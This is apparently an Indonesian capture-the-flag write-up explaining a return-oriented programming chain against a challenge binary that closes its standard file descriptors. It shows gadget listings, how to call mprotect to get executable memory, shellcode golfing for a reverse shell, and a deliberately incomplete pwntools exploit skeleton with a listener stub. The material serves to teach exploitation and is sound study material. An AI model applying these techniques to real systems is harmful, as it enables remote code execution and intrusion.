---
layout: post
author: zafirr
title:  "The Hardest ROP problem"
description: "*That I've solved"
date: 2021-03-08
last_modified_at: 2021-03-08
categories: writeup research
lang: id
tags:
    - pwn
    - buffer overflow
    - ROP
    - ctf
---

## Bahasa Indonesia
Akhir Agustus 2020, temanku ada tanya tentang soal CTF dari sebuah CTF lokal.

![Error](/assets/images/Hardest_ROP/1.png)

Soalnya terdiri dari satu file binary, dan dekompilasinya terlihat seperti berikut:

![Error](/assets/images/Hardest_ROP/2.png)

Detail tambahan:

![Error](/assets/images/Hardest_ROP/3.png) <br>
![Error](/assets/images/Hardest_ROP/4.png)

Ya itu aja. Beberapa orang mungkin mengenal jenis soal ROP begini dari situs [pwnable.tw](https://www.pwnable.tw/). Terdapat 3 soal pada situs tersebut yang mirip dengan yang ini (unexploitable, Kidding, De-ASLR). Dari dekompilasi dan proteksinya, aku suka melihat soal ini sebagai gabungan dari ketiganya.

Kalau mau dicoba soalnya, download [di sini](https://drive.google.com/drive/folders/1c0BaG-S18iTLihSoEnz0B_BcrzqDb8uT?usp=sharing)

Sebelum aku lanjut, aku saranin coba dulu soal unexploitable, Kidding, dan De-ASLR, karena solusi untuk soal ini dapat digunakan untuk menyelesaikan soal-soal itu juga. Coba aja sebulan dua bulan, sangat berguna kalau mau lebih jago binex.

<br>
<br>

### Ide dasar
Kapanpun terdapat soal binex yang menutup ketiga file descriptor, cara utama untuk menyelesaikan soal tersebut adalah dengan mendapatkan shellcode. Shellcode memungkinkan kita untuk membuka [socket](https://en.wikipedia.org/wiki/Network_socket) dengan syscall. Karena socket tersebut akan menggunakan file descriptor pertama, jika socket tersebut menunjuk ke alamat ip yang kita kontrol (katakanlah server privat), kita dapat menggunakan socket tersebut untuk meng-input lagi.

Jadi kita butuh shellcode, kita cek dulu ada bagian rwx tidak:

![Error](/assets/images/Hardest_ROP/5.png)

Yah gaada. Artinya kita perlu panggil mprotect atau mmap. [Mprotect](https://man7.org/linux/man-pages/man2/mprotect.2.html) lebih mudah seharusnya, karena syscallnya cuma butuh 3 parameter.

### Memanggil mprotect
Terdapat dua cara untuk memanggil mprotect. Pertama, kita dapat menggunakan instruksi syscall, dengan parameter yang diperlukan diset dengan ROP. Mari kita cek dulu apakah ada instruksi syscall atau tidak di bagian exec:

![Error](/assets/images/Hardest_ROP/6.png)

Yah gaada. Artinya kita perlu panggil dari bagian libc. Kita simpan dulu opsi ini.

Opsi kedua adalah memanggil fungsi mprotect. Mari kita cek dulu apakah ada fungsi ini pada GOT:

![Error](/assets/images/Hardest_ROP/7.png)

Yah gaada. Artinya kita perlu memanggilnya dari libc juga.

Aku gatau cara lain sih untuk panggil mprotect. Kalau ada yang tau komen dong, aku juga pengen tau.

### Mendapatkan nilai libc
Aku akan gunakan metode kedua, jauh lebih mudah seharusnya karena gausah diset register rax. Aku lewatin aja ya fase explorasinya, karena lama cari cara yang benar. Untuk mendapatkan sebuah nilai libc, aku bakal gunakan tiga gadget ajaib.

```
0x00000000004005dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```

\*Catatan: yang berikut ini gak ditemukan oleh ropper, gunakan ROPgadget!
```
0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
```

```
   0x400587:    push   r13
   0x400589:    push   r12
   0x40058b:    lea    r12,[rip+0x200836]        # 0x600dc8
   0x400592:    push   rbp
   0x400593:    lea    rbp,[rip+0x200836]        # 0x600dd0
   0x40059a:    push   rbx
   0x40059b:    mov    r13d,edi
   0x40059e:    mov    r14,rsi
   0x4005a1:    sub    rbp,r12
   0x4005a4:    sub    rsp,0x8
   0x4005a8:    sar    rbp,0x3
   0x4005ac:    call   0x400400
   0x4005b1:    test   rbp,rbp
   0x4005b4:    je     0x4005d6
   0x4005b6:    xor    ebx,ebx
   0x4005b8:    nop    DWORD PTR [rax+rax*1+0x0]
   0x4005c0:    mov    rdx,r15
   0x4005c3:    mov    rsi,r14
   0x4005c6:    mov    edi,r13d
   0x4005c9:    call   QWORD PTR [r12+rbx*8]
   0x4005cd:    add    rbx,0x1
   0x4005d1:    cmp    rbp,rbx
   0x4005d4:    jne    0x4005c0
   0x4005d6:    add    rsp,0x8
   0x4005da:    pop    rbx
   0x4005db:    pop    rbp
   0x4005dc:    pop    r12
   0x4005de:    pop    r13
   0x4005e0:    pop    r14
   0x4005e2:    pop    r15
   0x4005e4:    ret
```
\*Catatan: Ini cuma fungsi __libc_csu_init!

ANJIR YANG TERAKHIR ITU GADGET???!?!?!?

Iya. Bahkan, kalau kita mulai dari awal fungsinya, tetap termasuk gadget, karena kita bisa kontrol dimana gadget tersebut bakal `ret`.

Kenapa kita perlu gadget itu? Perhatikan bahwa tidak ada nilai libc pada bss:

![Error](/assets/images/Hardest_ROP/8.png)

Artinya kita perlu tempatin nilai libc disana secara manual. Ternyata, pada binary Full RELRO, GOT itu terletak pas sebelum bss:

![Error](/assets/images/Hardest_ROP/9.png)

Artinya dengan gadget pertama, kita dapat memasukkan sebuah nilai libc pada register r13/r14, lalu melanjutkan ROP chian dengan nilai yang ada pada bss. Menggunakan gadget kedua, kita bisa nulis pada area bss, jadi kita bisa nulis ROP chain lanjutan di bss. Menggunakan gadget ketiga, kita bisa `push` nilai libc yang ada pada r13 kedalam bss.

Coba kita tes!

Menggunakan gadget pertama, kita memasukkan nilai libc kedalam r13 dan r14.

![Error](/assets/images/Hardest_ROP/10.png)<br>
![Error](/assets/images/Hardest_ROP/11.png)

Menggunakan gadget kedua, aku nulis ROP chain singkat pada awal bss

![Error](/assets/images/Hardest_ROP/12.png) <br>
\*Catatan: 0x00000000004005e0 itu cuma `pop r14; pop r15`, keguanaannya itu cuma untuk mengurangi jumlah menulis, tapi memaksimalkan ukuran "bss stack". Ini gak mempengaruhi exploit, karena r14 dan r15 gak diperlukan pada saat ini.

Gadget ketiga mem-`push` nilai libc kedalam bss!

![Error](/assets/images/Hardest_ROP/13.png)<br>
![Error](/assets/images/Hardest_ROP/14.png)<br>
![Error](/assets/images/Hardest_ROP/15.png)

Aku saranin coba sendiri. Pelajari kenapa gadget ketiga itu berjalan, karena banyak yang terjadi pada gadget itu. Pelajari juga gadget ajaib macam yang kedua, yang aku pun gatau ada sampai September kemarin. Istirahat juga kalau perlu, karena ini banyak untuk satu posting blog.

### Mengubah nilai libcnya
Nah kita udah punya nilai libc di bss, sekarang kita perlu mengubahnya agar menunjuk ke mprotect. Jika kita lakukan hal itu, kita bisa memanggilnya (aku kasih nampak caranya nanti), yang berarti kita bisa dapatkan bagian rwx!

Terdapat dua opsi untuk mengubahnya. Pertama, karena kita tau bahwa 12 bit terakhir itu selalu sama (statik), kita bisa mengubah 2/3 byte terakhir dari nilai libc tersebut dan berharap bit yang dynamik itu benar. Sayangnya, ini mustahil, karena kita gabisa memanggil read lagi! Aku coba pikir cara cerdik seperti mengisi stdin dengan lebih dari 0x800 byte, terus panggil read lagi untuk nge-flush bytes tersebut, tapi sayangnya aku lupa stdin itu udah ditutup! Waduh. Yaudah kita buang aja deh opsi ini.

Opsi kedua ya... gunain gadget tadi. Coba kita teliti lebih dalam:

```
0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
```

Karena rbp dan rbx itu dapat dikontrol, gadget ini bisa digunakan. Pelajaran MTK SD memberitahu kita bahwa `0xf0b10` perlu ditambahkan pada nilai libc ini. Coba kita tes!

![Error](/assets/images/Hardest_ROP/16.png)<br>
![Error](/assets/images/Hardest_ROP/17.png)<br>
![Error](/assets/images/Hardest_ROP/18.png)<br>
![Error](/assets/images/Hardest_ROP/19.png)<br>
![Error](/assets/images/Hardest_ROP/20.png)

Mantap :)

### Memanggil mprotect!
Nah sekarang tinggal dipanggil aja. Terdapat berbagai cara untuk melakukan ini, menggunakan `ret` biasa pun bisa, tapi agak aneh lompat balik ke ROP chain sebelum. Daripada begitu, aku gunakan gadget berikut:

```
   0x4005c0:    mov    rdx,r15
   0x4005c3:    mov    rsi,r14
   0x4005c6:    mov    edi,r13d
   0x4005c9:    call   QWORD PTR [r12+rbx*8]
   0x4005cd:    add    rbx,0x1
   0x4005d1:    cmp    rbp,rbx
   0x4005d4:    jne    0x4005c0
   0x4005d6:    add    rsp,0x8
   0x4005da:    pop    rbx
   0x4005db:    pop    rbp
   0x4005dc:    pop    r12
   0x4005de:    pop    r13
   0x4005e0:    pop    r14
   0x4005e2:    pop    r15
   0x4005e4:    ret
```

Instruksi call itu mantap. Jika kita set rbx = 0, rbx = 1, dan r12 = alamat dari nilai libc tadi, kita bisa panggil mprotect. Pada waktu bersamaan, kita gunakan tiga instruksi pertama untuk mengatur nilai parameter fungsi. Mantap sekali!

![Error](/assets/images/Hardest_ROP/21.png)<br>
![Error](/assets/images/Hardest_ROP/22.png)<br>
![Error](/assets/images/Hardest_ROP/23.png)

Yay!

### Shellcode?
Tunggu, kita belum punya shellcode di bss. Gak masalah kok, kita punya gadget yang tadi!. Sekarang soalnya jadi macam soal golf. Dibutuhkan 8 word untuk menulis 4 byte saja, jadi payah kita mengurangi shellcode kita banyak-banyak. Kita bisa menyelesaikan soal ini dengan shellcode yang dihasilkan pwntools, terus dikurangi aja manual. Ohya ukuran buffernya menyebabkan kita gabisa nulis shellcode yang membuka socket, duplikasi file, DAN panggil `/bin/sh`, jadi cari deh cara untuk melakukan itu :) (Kalau udah solve Kidding, seharusnya gampang). Terima kasih H\*\*\*\*\*\*\*\*\* yang sudah mengajari cara solve Kidding.

![Error](/assets/images/Hardest_ROP/24.png)

Pada akhirnya, kurang dari 100 byte lagi yang bisa diinput :v

Kalau semua udah dibuat, shell jalan pada reverse shell.

![Error](/assets/images/Hardest_ROP/25.png)

Bonus, saya gak kasih exploit akhirnya! Ini aku kasih kerangkanya, karena aku baik :)

exploit.py
```py
from pwn import *

p = process('./main.file')

add_dword_ptr_rbp_0x3d_ebx = 0x0000000000400518
pop_rbx_rbp_r12_r13_r14_r15 = 0x00000000004005da
pop_rsp_r13_r14_r15 = 0x00000000004005dd
bss = 0x0000000000601000
bss2 = 0x0000000000601900
shellcode_loc = 0x0000000000601a00
get_libc_val_in_r13 = 0x600ff0
main = 0x400537
pop_r14_r15 = 0x4005e0
push_r13 = 0x400587
leak_location = 0x601038
rdx_thing = 0x4005c0
pop_rbp = 0x00000000004004b8

context.arch = 'amd64'

def www(where, what, r12=0, r13=0, r14=0, r15=0):
    return # Lol figure it out

def write_shellcode(where):
    sc = asm('') # Shellcode goes here
    res = b""
    for i in range(0, len(sc), 4):
        res += www(# Something, something)
    return res

payload = b"A"*24
payload += b"" # ROP CHAIN!


assert len(payload) <= 2048
p.sendline(payload)

p.interactive()
p.close()(
```

rev_tcp.py
```py
from pwn import *

l = listen(10000)

l.wait_for_connection()

# Something is needed here!

l.interactive()
```

### Penutup
Kayaknya aku udah menaklukkan ROP. Ya kecuali kalo ada yang mau buat yang lebih susah? :)
